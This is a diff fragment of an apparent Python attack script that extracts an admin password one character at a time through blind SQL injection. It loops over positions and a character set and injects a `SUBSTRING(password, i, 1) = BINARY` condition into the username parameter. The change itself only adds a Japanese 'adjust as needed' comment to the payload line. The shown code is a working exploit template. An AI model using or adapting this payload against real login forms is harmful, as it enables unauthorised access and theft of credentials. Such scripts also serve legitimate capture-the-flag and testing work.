@@ -17,7 +17,7 @@ use_auth = bool(auth_user and auth_pass)
 for i in range(1, max_password_length + 1):
     found = False
     for c in charset:
-        payload = f'admin" AND SUBSTRING(password, {i}, 1) = BINARY "{c}" -- '
+        payload = f'admin" AND SUBSTRING(password, {i}, 1) = BINARY "{c}" -- ' #適宜変更
         params={"username": payload} #適宜変更
 
         if use_auth:
